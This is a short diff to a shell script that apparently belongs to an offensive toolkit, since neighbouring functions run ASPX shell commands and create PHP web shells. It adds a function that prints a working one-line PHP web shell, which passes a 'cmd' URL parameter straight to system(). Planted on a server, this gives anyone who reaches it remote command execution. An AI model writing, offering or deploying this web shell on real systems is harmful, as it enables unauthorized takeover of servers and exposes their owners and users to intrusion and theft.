@@ -240,6 +240,10 @@ run_aspx_shell_command() {
 
 }
 
+get_simple_php_webshell() {
+    echo "<?php system(\$_GET['cmd']); ?>" 
+}
+
 create_php_web_shell() {
     create_php_webshell
 }
